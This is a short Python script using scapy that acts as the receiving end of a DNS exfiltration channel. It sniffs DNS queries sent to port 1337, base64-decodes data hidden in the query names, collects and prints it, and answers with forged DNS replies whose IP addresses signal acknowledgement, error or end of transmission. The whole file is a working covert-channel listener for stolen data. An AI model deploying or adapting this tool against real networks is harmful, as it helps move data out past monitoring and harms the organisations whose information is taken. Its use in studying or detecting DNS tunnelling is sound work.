from base64 import b64decode
import socket
from scapy.all import *
from time import sleep



# Query, which is the entire packet that was sent our request.
def sendResponse(query,ip):
    question = query[DNS].qd
    answer = DNSRR(rrname=question.qname,ttl=1000,rdata=ip)
    response = Ether(src=query[Ether].dst,dst=query[Ether].src)/IP(src=query[IP].dst,dst=query[IP].src)/UDP(dport=query[UDP].sport,sport=
    1337)/DNS(id=query[DNS].id,qr=1,qdcount=1,ancount=1,qd=query[DNS].qd,an=answer)

    sleep(1)
    sendp(response) # p means working at layer 2 instead of layer 3



extracted = ""

# The goal of this function is to read in and interpret,
# the information being sent via our DNS exfiltration
def extractData(x):
    global extracted
    # WE test to see if we have a DNS layer and 
    # also test if the destination port of UDP traffic is port 1337
    if x.haslayer(DNS) and x[UDP].dport == 1337:
        domain = x[DNS].qd.qname
        ind = domain.index(bytes(".","utf-8"))
        data = domain[:ind]
        padnum = (4-(len(data)%4))%4
        data += bytes("="*padnum,"utf-8")
        try:
            decoded = b64decode(data).decode("utf-8")
            if decoded == "R":
                response = sendResponse(x,"192.168.178.3")
                print("End transmission")
                print(extracted)
            else:
                extracted += decoded
                response = sendResponse(x,"192.168.178.4")
        except Exception as e:
            print(e)
            response = sendResponse(x,"192.168.178.2")




s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("",1337))

sniff(prn=extractData)